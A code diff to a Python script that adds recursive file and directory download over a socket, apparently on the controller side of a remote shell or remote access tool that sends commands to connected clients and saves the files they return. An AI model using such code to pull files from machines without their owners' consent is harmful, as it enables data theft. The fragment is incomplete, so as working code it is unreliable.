@@ -93,6 +93,27 @@ def download(filetype, client, cmd):
         for a in range(0, number_of_files):
             downloadfile(client)
 
+def download2(client):
+    filetype = recv(client)
+    if filetype == "file\n":
+        downloadfile(client)
+        send(client, "done")
+        print(recv(client))
+
+    elif filetype == "dir\n":
+        folder_name = recv(client)[:-1]
+        try:
+            os.mkdir(folder_name)
+        except:
+            pass
+        os.chdir(folder_name)
+      
+        number_of_files = int(recv(client).replace("number_of_files: ",""))
+
+        for a in range(0, number_of_files):
+            download2(client)
+        
+
 def downloadfile(client):
     filename = recv(client)
     filename = filename.replace("downloading ","")[:-1]
@@ -107,8 +128,6 @@ def downloadfile(client):
             f.write(data)
             size -= len(data)
     print('Image Saved')
-    send(client, "ok")
-    print(recv(client))
  
     
 def commands(cmd, output, client):
@@ -119,7 +138,8 @@ def commands(cmd, output, client):
 
         output = recv(client)
     if cmd.startswith("download "):
-            download(output,client, cmd)
+            download2(client)
+            output = (recv(client))
 
            
     return output
